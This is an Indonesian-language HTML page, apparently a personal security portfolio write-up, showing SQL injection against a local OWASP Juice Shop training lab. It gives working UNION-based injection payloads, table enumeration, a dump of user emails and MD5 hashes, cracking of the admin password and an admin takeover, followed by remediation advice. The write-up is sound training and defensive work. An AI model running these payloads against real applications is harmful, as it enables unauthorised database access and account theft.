@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>SQL Injection → Kompromi Database Penuh — Twist</title>
+<meta name="description" content="SQL Injection → Kompromi Database Penuh — Twist">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<header class="site"><div class="wrap">
+  <span class="brand">Twist<span class="dot">://</span>security</span>
+  <nav>
+    <a href="../index.html">Writeups</a>
+    <a href="../index.html#tentang">Tentang</a>
+  </nav>
+</div></header>
+<article><div class="wrap">
+<div class="crumbs"><a href="../index.html">writeups</a> / 001</div>
+<h1>SQL Injection → Kompromi Database Penuh</h1>
+<div class="meta-box">
+  <div><b>Target</b> Juice Shop</div>
+  <div><b>Kelas</b> Injection</div>
+  <div><b>Severity</b> <span class="badge" style="color:#ff4d5e">CRITICAL</span> <small>cvss 9.8</small></div>
+  <div><b>Peneliti</b> Twist</div>
+</div>
+
+<p><strong>Target:</strong> OWASP Juice Shop (instance lokal — lab latihan resmi)
+<strong>Endpoint:</strong> <code>GET /rest/products/search</code>
+<strong>Parameter:</strong> <code>q</code>
+<strong>Tanggal:</strong> 9 Oktober 2026
+<strong>Peneliti:</strong> Twist
+<strong>Severity:</strong> CRITICAL (CVSS ~9.8)</p>
+<hr />
+<h2 id="1-ringkasan">1. Ringkasan</h2>
+<p>Parameter <code>q</code> pada endpoint pencarian produk dimasukkan langsung ke query SQL
+tanpa sanitasi. Penyerang tanpa autentikasi bisa:</p>
+<ul>
+<li>Menampilkan data arbitrer dari <strong>seluruh database</strong> (20 tabel)</li>
+<li>Mengambil <strong>24 akun pengguna + seluruh hash password</strong></li>
+<li>Memecahkan hash admin (<code>md5("admin123")</code>)</li>
+<li><strong>Login sebagai administrator</strong> dan mengakses data seluruh pengguna</li>
+</ul>
+<p>Tidak butuh akun. Tidak butuh login. Satu request HTTP.</p>
+<hr />
+<h2 id="2-dampak">2. Dampak</h2>
+<table>
+<thead>
+<tr>
+<th>Aspek</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Autentikasi diperlukan</td>
+<td><strong>Tidak</strong> — endpoint publik</td>
+</tr>
+<tr>
+<td>Data terpapar</td>
+<td>Seluruh database: 20 tabel</td>
+</tr>
+<tr>
+<td>Akun terkompromi</td>
+<td>24 akun + hash password</td>
+</tr>
+<tr>
+<td>Eskalasi</td>
+<td>Admin takeover penuh (terbukti)</td>
+</tr>
+<tr>
+<td>Integritas</td>
+<td>Penyerang bisa membaca + mengubah data (<code>UPDATE</code>/<code>DELETE</code> via stacking)</td>
+</tr>
+</tbody>
+</table>
+<p>Klasifikasi: <strong>Critical</strong> — pengambilalihan penuh tanpa autentikasi.</p>
+<hr />
+<h2 id="3-langkah-reproduksi">3. Langkah Reproduksi</h2>
+<h3 id="bukti-1-konfirmasi-injeksi">Bukti 1 — Konfirmasi injeksi</h3>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rest/products/search?q=apple</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:3000</span>
+</code></pre></div>
+
+<p>→ <code>200 OK</code>, 3 produk</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rest/products/search?q=apple'</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+
+<p>→ <strong>Error SQL</strong> (karakter kutip masuk ke query)</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rest/products/search?q=apple'))--</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</code></pre></div>
+
+<p>→ <code>200 OK</code>, 0 produk — <strong>query valid, filter dimatikan</strong></p>
+<p>Perbedaan antara error dan sukses membuktikan struktur query bisa dikendalikan.</p>
+<h3 id="bukti-2-menentukan-jumlah-kolom">Bukti 2 — Menentukan jumlah kolom</h3>
+<div class="codehilite"><pre><span></span><code><span class="err">GET /rest/products/search?q=a')) ORDER BY 9--   → 200 OK  (VALID)</span>
+<span class="err">GET /rest/products/search?q=a')) ORDER BY 10--  → ERROR</span>
+</code></pre></div>
+
+<p>→ Tabel punya <strong>9 kolom</strong>.</p>
+<h3 id="bukti-3-union-untuk-menampilkan-data-arbitrer">Bukti 3 — UNION untuk menampilkan data arbitrer</h3>
+<div class="codehilite"><pre><span></span><code><span class="err">GET /rest/products/search?q=qwert')) UNION SELECT 1,2,3,4,5,6,7,8,9--</span>
+</code></pre></div>
+
+<p><strong>Respons:</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"data"</span><span class="p">:[{</span><span class="nt">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"name"</span><span class="p">:</span><span class="s2">"2"</span><span class="p">,</span><span class="nt">"description"</span><span class="p">:</span><span class="s2">"3"</span><span class="p">,</span><span class="nt">"price"</span><span class="p">:</span><span class="mi">4</span><span class="p">,</span>
+<span class="w">          </span><span class="nt">"deluxePrice"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nt">"image"</span><span class="p">:</span><span class="mi">6</span><span class="p">,</span><span class="nt">"createdAt"</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span><span class="nt">"updatedAt"</span><span class="p">:</span><span class="mi">8</span><span class="p">,</span><span class="nt">"deletedAt"</span><span class="p">:</span><span class="mi">9</span><span class="p">}]}</span>
+</code></pre></div>
+
+<p>→ Nilai yang saya kirim muncul di respons. <strong>Data arbitrer bisa ditampilkan.</strong></p>
+<h3 id="bukti-4-enumerasi-20-tabel">Bukti 4 — Enumerasi 20 tabel</h3>
+<div class="codehilite"><pre><span></span><code><span class="err">GET /rest/products/search?q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--</span>
+</code></pre></div>
+
+<p><strong>Hasil:</strong></p>
+<div class="codehilite"><pre><span></span><code>Addresses      BasketItems    Baskets        Captchas
+Cards          Complaints     Deliverys      Feedbacks
+Hints          Memories       PrivacyRequests Products
+Quantities     Recycles       SecurityAnswers SecurityQuestions
+Users          ChallengeDependencies           Challenges
+ImageCaptchas
+</code></pre></div>
+
+<h3 id="bukti-5-dump-tabel-users">Bukti 5 — Dump tabel Users</h3>
+<div class="codehilite"><pre><span></span><code><span class="err">GET /rest/products/search?q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--</span>
+</code></pre></div>
+
+<p><strong>Hasil: 24 akun, seluruh hash password:</strong></p>
+<div class="codehilite"><pre><span></span><code>admin@juice-sh.op          0192023a7bbd73250516f069df18b500
+jim@juice-sh.op            e541ca7ecf72b8d1286474fc613e5e45
+bender@juice-sh.op         0c36e517e3fa95aabf1bbffc6744a4ef
+bjoern.kimminich@gmail.com 6edd9d726cbdc873c539e41ae8757b8c
+ciso@juice-sh.op           861917d5fa5f1172f931dc700d81a8fb
+support@juice-sh.op        3869433d74e3d0c86fd25562f836bc82
+morty@juice-sh.op          f2f933d0bb0ba057bc8e33b8ebd6d9e8
+mc.safesearch@juice-sh.op  b03f4b0ba8b458fa0acdc02cdb953bc8
+J12934@juice-sh.op         3c2abc04e4a6ea8f1327d0aae3714b7d
+wurstbrot@juice-sh.op      9ad5b0492bbe528583e128d2a8941de4
+amy@juice-sh.op            030f05e45e30710c3ad3c32f00de0473
+bjoern@juice-sh.op         7f311911af16fa8f418dd1a3051d6810
+bjoern@owasp.org           9283f1b2e9669749081963be0462e466
+chris.pike@juice-sh.op     10a783b9ed19ea1c67c3a27699f0095b
+... (24 total)
+</code></pre></div>
+
+<h3 id="bukti-6-memecahkan-hash-admin">Bukti 6 — Memecahkan hash admin</h3>
+<div class="codehilite"><pre><span></span><code>target : 0192023a7bbd73250516f069df18b500
+md5("admin123") = 0192023a7bbd73250516f069df18b500
+✅ COCOK
+</code></pre></div>
+
+<h3 id="bukti-7-login-sebagai-administrator">Bukti 7 — Login sebagai administrator</h3>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/rest/user/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+
+<span class="p">{</span><span class="nt">"email"</span><span class="p">:</span><span class="s2">"admin@juice-sh.op"</span><span class="p">,</span><span class="nt">"password"</span><span class="p">:</span><span class="s2">"admin123"</span><span class="p">}</span>
+</code></pre></div>
+
+<p><strong>Respons: <code>200 OK</code></strong></p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"authentication"</span><span class="p">:{</span><span class="nt">"token"</span><span class="p">:</span><span class="s2">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."</span><span class="p">,</span><span class="nt">"umail"</span><span class="p">:</span><span class="s2">"admin@juice-sh.op"</span><span class="p">}}</span>
+</code></pre></div>
+
+<p>→ Token JWT 717 karakter diterbitkan untuk akun administrator.</p>
+<h3 id="bukti-8-akses-endpoint-terproteksi">Bukti 8 — Akses endpoint terproteksi</h3>
+<div class="codehilite"><pre><span></span><code>GET /api/Users  (tanpa token)         → 401 Unauthorized
+GET /api/Users  (Bearer &lt;token admin&gt;) → 200 OK  → 23 akun terbuka
+</code></pre></div>
+
+<p>→ <strong>Bypass kontrol akses terbukti.</strong></p>
+<hr />
+<h2 id="4-akar-masalah">4. Akar Masalah</h2>
+<p>Query di endpoint pencarian menyusun SQL dengan penggabungan string:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// KIRA-KIRA SEPERTI INI (berdasarkan struktur yang teramati):</span>
+<span class="nx">db</span><span class="p">.</span><span class="nx">sequelize</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
+<span class="w">  </span><span class="sb">`SELECT * FROM Products WHERE ((name LIKE '%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%' OR description LIKE '%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%')</span>
+<span class="sb">   AND deletedAt IS NULL) ORDER BY name`</span>
+<span class="p">);</span>
+</code></pre></div>
+
+<p>Nilai <code>q</code> dari pengguna masuk ke dalam string query tanpa parameterisasi.
+Tanda kutip tunggal menutup string literal, sehingga sisa payload dieksekusi
+sebagai SQL.</p>
+<p>Petunjuk struktur query dari pengujian:
+- <code>apple'))--</code> berhasil → query asli punya <strong>dua kurung tutup</strong> sebelum sisa kondisi
+- <code>ORDER BY 10</code> error → tabel <strong>9 kolom</strong></p>
+<hr />
+<h2 id="5-saran-perbaikan">5. Saran Perbaikan</h2>
+<p><strong>1. Pakai query terparameterisasi (WAJIB — ini akar masalahnya)</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// JANGAN:</span>
+<span class="sb">`SELECT * FROM Products WHERE name LIKE '%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%'`</span>
+
+<span class="c1">// LAKUKAN:</span>
+<span class="nx">sequelize</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
+<span class="w">  </span><span class="s1">'SELECT * FROM Products WHERE name LIKE :q OR description LIKE :q'</span><span class="p">,</span>
+<span class="w">  </span><span class="p">{</span><span class="w"> </span><span class="nx">replacements</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">q</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="nx">QueryTypes</span><span class="p">.</span><span class="nx">SELECT</span><span class="w"> </span><span class="p">}</span>
+<span class="p">);</span>
+</code></pre></div>
+
+<p>Atau pakai ORM dengan aman:</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">Product</span><span class="p">.</span><span class="nx">findAll</span><span class="p">({</span>
+<span class="w">  </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">or</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">      </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">},</span>
+<span class="w">      </span><span class="p">{</span><span class="w"> </span><span class="nx">description</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">[</span><span class="nx">Op</span><span class="p">.</span><span class="nx">like</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="sb">`%</span><span class="si">${</span><span class="nx">q</span><span class="si">}</span><span class="sb">%`</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="p">]</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div>
+
+<p><strong>2. Validasi input sebagai lapisan tambahan</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">q</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s1">'string'</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">q</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">100</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s1">'Input tidak valid'</span><span class="w"> </span><span class="p">});</span>
+</code></pre></div>
+
+<p><strong>3. Prinsip hak akses minimum di database</strong>
+Akun database aplikasi tidak perlu hak <code>DROP</code>/<code>ALTER</code>. Batasi ke <code>SELECT</code>/<code>INSERT</code>/<code>UPDATE</code>
+pada tabel yang diperlukan saja.</p>
+<p><strong>4. Jangan simpan password dengan MD5</strong></p>
+<p>MD5 itu fungsi hash cepat, bukan untuk password. Ganti ke:</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">bcrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'bcrypt'</span><span class="p">);</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">bcrypt</span><span class="p">.</span><span class="nx">hash</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="mf">12</span><span class="p">);</span>
+</code></pre></div>
+
+<p>MD5 tanpa salt juga bikin seluruh hash bisa di-crack lewat rainbow table dalam hitungan detik.</p>
+<p><strong>5. Ganti tabel Users dengan admin segera</strong>
+Semua 24 kredensial harus direset setelah patch.</p>
+<hr />
+<h2 id="6-catatan-tambahan-temuan-sekunder">6. Catatan Tambahan (temuan sekunder)</h2>
+<p>Ditemukan saat recon, terpisah dari kerentanan utama:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Temuan</th>
+<th>Endpoint</th>
+<th>Severity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Header <code>Content-Security-Policy</code> tidak ada</td>
+<td>semua</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Header <code>Strict-Transport-Security</code> tidak ada</td>
+<td>semua</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>Access-Control-Allow-Origin: *</code></td>
+<td><code>/</code></td>
+<td>Low/Medium</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>X-Frame-Options</code> cuma <code>SAMEORIGIN</code> (tidak ada CSP <code>frame-ancestors</code>)</td>
+<td>semua</td>
+<td>Info</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-lampiran-timeline">7. Lampiran — Timeline</h2>
+<div class="codehilite"><pre><span></span><code>1. Recon header + fingerprint          → 2 temuan header
+2. Enumerasi endpoint dari main.js     → 15 API + 21 REST
+3. Uji injeksi: apple' vs apple'))--   → INJEKSI TERKONFIRMASI
+4. ORDER BY 9 / 10                     → 9 kolom
+5. UNION SELECT 1..9                   → data arbitrer tampil
+6. sqlite_master                       → 20 tabel
+7. Dump Users                          → 24 akun + hash
+8. Crack md5 admin123                  → cocok
+9. Login admin                         → 200 OK, token terbit
+10. /api/Users dengan token            → 401 → 200, 23 akun
+</code></pre></div>
+
+<hr />
+<h2 id="8-pelajaran-dari-latihan-ini">8. Pelajaran dari Latihan Ini</h2>
+<div class="codehilite"><pre><span></span><code>✓ Recon dulu, baru nyerang — endpoint ketemu dari baca main.js
+✓ Uji perbedaan respons (error vs sukses), itu sinyal paling kuat
+✓ ORDER BY itu cara paling cepat cari jumlah kolom
+✓ Buktiin DAMPAK, bukan cuma "ada injeksi"
+   → dump data nyata + login berhasil = laporan yang dibayar
+✓ Catat SEMUA langkah dengan request/response mentah
+✓ Laporan = reviewer bisa reproduksi tanpa mikir
+
+✗ Jangan stop di "SQLi terdeteksi" — lanjut sampai bukti dampak
+✗ Jangan lupa temuan sekunder (header) — sering dibayar terpisah
+</code></pre></div>
+<div class="crumbs" style="margin-top:52px"><a href="../index.html">← balik ke daftar writeup</a></div>
+</div></article>
+<footer class="site"><div class="wrap">
+  <span>Portofolio keamanan — latihan lab legal (OWASP Juice Shop).</span>
+  <span class="mono">dibuat 2026-10-09</span>
+</div></footer>
+</body>
+</html>
